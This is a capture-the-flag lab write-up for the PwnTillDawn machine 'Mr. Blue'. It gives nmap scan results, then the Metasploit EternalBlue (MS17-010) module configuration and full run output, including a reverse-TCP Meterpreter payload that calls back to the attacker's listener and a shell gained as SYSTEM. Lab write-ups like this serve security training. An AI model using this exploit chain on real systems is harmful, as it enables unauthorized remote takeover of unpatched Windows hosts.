---
description: Wizlynx PwnTillDawn Online Mr. Blue
---

# Mr. Blue (10.150.150.242)

## Nmap

{% code overflow="wrap" %}
```bash
Nmap scan report for 10.150.150.242
Host is up, received user-set (0.27s latency).
Scanned at 2024-02-21 10:02:58 +08 for 102s
Not shown: 985 closed tcp ports (reset)
PORT      STATE SERVICE      REASON          VERSION
53/tcp    open  domain       syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB1446A) 
80/tcp    open  http         syn-ack ttl 127 Microsoft IIS httpd 7.5
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows Server 2008 R2 Enterprise 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
1433/tcp  open  ms-sql-s     syn-ack ttl 127 Microsoft SQL Server 2012 11.00.2100.00; 
3389/tcp  open  tcpwrapped   syn-ack ttl 127
8089/tcp  open  ssl/http     syn-ack ttl 127 Splunkd httpd
49152/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49156/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49158/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
```
{% endcode %}

### FLAG34

{% code overflow="wrap" %}
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.150.150.242   yes       The target host(s), see https://docs.metasploit.com/docs/using-metaspl
                                             oit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects
                                             Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target
                                             machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Wind
                                             ows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target mach
                                             ines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server
                                              2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.66.67.86      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.66.67.86:4444 
[*] 10.150.150.242:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.150.150.242:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Enterprise 7601 Service Pack 1 x64 (64-bit)
[*] 10.150.150.242:445    - Scanned 1 of 1 hosts (100% complete)
[+] 10.150.150.242:445 - The target is vulnerable.
[*] 10.150.150.242:445 - Connecting to target for exploitation.
[+] 10.150.150.242:445 - Connection established for exploitation.
[+] 10.150.150.242:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.150.150.242:445 - CORE raw buffer dump (53 bytes)
[*] 10.150.150.242:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
[*] 10.150.150.242:445 - 0x00000010  30 30 38 20 52 32 20 45 6e 74 65 72 70 72 69 73  008 R2 Enterpris
[*] 10.150.150.242:445 - 0x00000020  65 20 37 36 30 31 20 53 65 72 76 69 63 65 20 50  e 7601 Service P
[*] 10.150.150.242:445 - 0x00000030  61 63 6b 20 31                                   ack 1           
[+] 10.150.150.242:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.150.150.242:445 - Trying exploit with 12 Groom Allocations.
[*] 10.150.150.242:445 - Sending all but last fragment of exploit packet
[*] 10.150.150.242:445 - Starting non-paged pool grooming
[+] 10.150.150.242:445 - Sending SMBv2 buffers
[+] 10.150.150.242:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.150.150.242:445 - Sending final SMBv2 buffers.
[*] 10.150.150.242:445 - Sending last fragment of exploit packet!
[*] 10.150.150.242:445 - Receiving response from exploit packet
[+] 10.150.150.242:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.150.150.242:445 - Sending egg to corrupted connection.
[*] 10.150.150.242:445 - Triggering free of corrupted buffer.
[*] Sending stage (201798 bytes) to 10.150.150.242
[+] 10.150.150.242:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.150.150.242:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.150.150.242:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Meterpreter session 1 opened (10.66.67.86:4444 -> 10.150.150.242:51169) at 2024-02-21 10:10:51 +0800

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
{% endcode %}
